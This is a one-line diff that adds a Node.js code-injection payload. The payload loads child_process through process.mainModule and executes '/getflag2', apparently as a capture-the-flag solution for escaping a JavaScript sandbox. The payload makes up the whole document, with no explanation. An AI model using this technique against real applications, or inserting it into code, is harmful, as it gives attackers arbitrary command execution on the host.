@@ -1,0 +1,1 @@
+process.mainModule.constructor._load("child_process").exec("/getflag2", console.log);
